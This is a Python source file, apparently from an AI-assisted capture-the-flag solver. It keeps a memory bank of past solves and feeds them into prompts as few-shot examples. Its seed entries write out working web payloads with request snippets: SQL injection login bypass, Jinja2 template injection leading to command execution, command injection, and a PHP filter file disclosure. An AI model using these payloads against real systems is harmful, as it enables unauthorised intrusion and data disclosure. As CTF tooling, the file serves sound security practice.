import os
import json
import re
from pathlib import Path
from typing import Dict, Any, List, Optional

ROOT_DIR = Path(__file__).resolve().parent.parent
KNOWLEDGE_FILE = ROOT_DIR / "knowledge" / "experiences.json"
WRITEUPS_DIR = ROOT_DIR / "writeups"

DEFAULT_SEED_EXPERIENCES = [
    {
        "id": "seed_sqli_auth_bypass",
        "vuln_class": "SQL Injection (Raw Query)",
        "tech_stack": ["Python", "Flask", "SQLite"],
        "title": "SQLi Login Bypass with Comment Neutralization",
        "working_payload": "username: \"admin' --\" or \"' OR 1=1 --\"",
        "lesson": "Always use '--' or '/*' to comment out trailing password checks in SQL queries.",
        "snippet": "requests.post(url, data={'username': \"' OR 1=1 --\", 'password': 'x'})"
    },
    {
        "id": "seed_jinja2_ssti",
        "vuln_class": "SSTI (Jinja2/Flask)",
        "tech_stack": ["Python", "Flask", "Jinja2"],
        "title": "Flask Jinja2 SSTI Config & RCE Extraction",
        "working_payload": "{{ config['FLAG'] }} or {{ cycler.__init__.__globals__.os.popen('cat flag* || type flag.txt').read() }}",
        "lesson": "First check config values via {{ config }}. For RCE, climb class hierarchy or use cycler/url_for globals.",
        "snippet": "requests.get(url, params={'name': \"{{ config['FLAG'] }}\"})"
    },
    {
        "id": "seed_command_injection",
        "vuln_class": "Command Injection / RCE",
        "tech_stack": ["Python", "PHP", "Generic"],
        "title": "Multi-Platform Command Injection Traversal",
        "working_payload": "127.0.0.1 & cat flag.txt || type flag.txt || cat /flag*",
        "lesson": "On Windows cmd use '&' or '|', on Linux use ';' or '|'. Probe both local 'flag.txt' and root '/flag.txt'.",
        "snippet": "requests.get(url, params={'ip': '127.0.0.1 & cat flag.txt || type flag.txt'})"
    },
    {
        "id": "seed_php_lfi_filter",
        "vuln_class": "Path Traversal / LFI",
        "tech_stack": ["PHP"],
        "title": "PHP Wrapper Arbitrary File Disclosure",
        "working_payload": "php://filter/convert.base64-encode/resource=flag",
        "lesson": "Use php://filter to bypass server-side PHP execution and extract raw base64 source code.",
        "snippet": "r = requests.get(url, params={'page': 'php://filter/convert.base64-encode/resource=flag'}); flag = base64.b64decode(r.text)"
    }
]

class ExperienceMemory:
    def __init__(self, storage_path: Path = KNOWLEDGE_FILE, writeups_path: Path = WRITEUPS_DIR):
        self.storage_path = storage_path
        self.writeups_path = writeups_path
        self.storage_path.parent.mkdir(parents=True, exist_ok=True)
        self.writeups_path.mkdir(parents=True, exist_ok=True)
        self._ensure_storage()

    def _ensure_storage(self):
        """Initializes knowledge storage with seeds if not present."""
        if not self.storage_path.is_file():
            data = {"version": "1.0", "experiences": DEFAULT_SEED_EXPERIENCES}
            self.storage_path.write_text(json.dumps(data, indent=2, ensure_ascii=False), encoding="utf-8")

    def load_experiences(self) -> List[Dict[str, Any]]:
        try:
            content = self.storage_path.read_text(encoding="utf-8")
            data = json.loads(content)
            return data.get("experiences", [])
        except Exception:
            return DEFAULT_SEED_EXPERIENCES

    def record_solve(
        self,
        challenge_name: str,
        analysis_data: Dict[str, Any],
        exploit_code: str,
        flag: str,
        scenario_name: Optional[str] = None
    ):
        """Records a successful challenge solve into the permanent memory bank."""
        experiences = self.load_experiences()
        
        # Effective identifier prioritizes scenario_name if provided
        effective_name = scenario_name.strip() if scenario_name and scenario_name.strip() else challenge_name
        target_id = f"solve_{re.sub(r'[^a-zA-Z0-9_]', '_', effective_name.lower())}"

        # Avoid duplicate entries for same challenge if same ID or same flag
        for exp in experiences:
            if exp.get("id") == target_id or (exp.get("challenge_name") == effective_name and exp.get("flag") == flag):
                exp["exploit_code"] = exploit_code[:1200]
                exp["flag"] = flag
                self._save(experiences)
                return

        # Extract primary vuln class
        vuln_class = "Generic Web"
        sinks = analysis_data.get("dangerous_sinks", [])
        if sinks:
            vuln_class = sinks[0].get("vuln_class", "Generic Web")
        elif "api" in exploit_code.lower() or "json" in exploit_code.lower():
            vuln_class = "API Analysis & Hidden Parameters"

        new_entry = {
            "id": target_id,
            "challenge_name": effective_name,
            "vuln_class": vuln_class,
            "tech_stack": analysis_data.get("tech_stack", []),
            "title": f"Solved Challenge: {effective_name}",
            "lesson": f"Successfully extracted flag using targeted payload matching {vuln_class}.",
            "snippet": exploit_code[:800],
            "flag": flag
        }
        experiences.append(new_entry)
        self._save(experiences)

    def _save(self, experiences: List[Dict[str, Any]]):
        data = {"version": "1.0", "experiences": experiences}
        self.storage_path.write_text(json.dumps(data, indent=2, ensure_ascii=False), encoding="utf-8")

    def get_relevant_context(self, analysis_data: Dict[str, Any], limit: int = 2) -> str:
        """
        Retrieves matching past experiences and writeup notes to inject as few-shot
        examples in the AI prompt.
        """
        experiences = self.load_experiences()
        target_sinks = [s.get("vuln_class", "") for s in analysis_data.get("dangerous_sinks", [])]
        target_stack = analysis_data.get("tech_stack", [])

        scored = []
        for exp in experiences:
            score = 0
            # Sinks match
            for ts in target_sinks:
                if ts and ts.lower() in exp.get("vuln_class", "").lower():
                    score += 5
            # Stack match
            for stk in target_stack:
                if any(stk.lower() in s.lower() for s in exp.get("tech_stack", [])):
                    score += 2

            if score > 0:
                scored.append((score, exp))

        # Sort by relevance
        scored.sort(key=lambda x: x[0], reverse=True)
        top_picks = [item[1] for item in scored[:limit]]

        # If no specific match found, take the first seed example as reference
        if not top_picks and experiences:
            top_picks = experiences[:1]

        # Scan for user-provided writeups matching keywords
        writeup_notes = self._scan_writeup_files(target_sinks, target_stack)

        lines = ["### RELEVANT PAST EXPERIENCES & SOLVED PATTERNS (MEMORY BANK):"]
        for i, p in enumerate(top_picks, 1):
            lines.append(f"--- Example Case {i}: {p.get('title')} ---")
            lines.append(f"Category: {p.get('vuln_class')}")
            if p.get("working_payload"):
                lines.append(f"Working Payload Pattern: {p.get('working_payload')}")
            if p.get("lesson"):
                lines.append(f"Key Lesson: {p.get('lesson')}")
            if p.get("snippet"):
                lines.append(f"Working Script Snippet:\n```python\n{p.get('snippet')}\n```")

        if writeup_notes:
            lines.append("\n### NOTES FROM USER WRITEUPS:")
            lines.append(writeup_notes)

        return "\n".join(lines)

    def _scan_writeup_files(self, target_sinks: List[str], target_stack: List[str], max_chars: int = 2000) -> str:
        """Reads community or user writeups dropped into writeups/."""
        if not self.writeups_path.exists():
            return ""

        collected = []
        for fpath in self.writeups_path.glob("*.md"):
            try:
                text = fpath.read_text(encoding="utf-8", errors="ignore")
                # Check if writeup mentions any target sink or stack
                is_relevant = any(ts.lower() in text.lower() for ts in target_sinks if ts)
                if is_relevant:
                    snippet = f"[{fpath.name}]\n{text[:800]}\n"
                    collected.append(snippet)
            except Exception:
                pass
        return "\n".join(collected)[:max_chars]
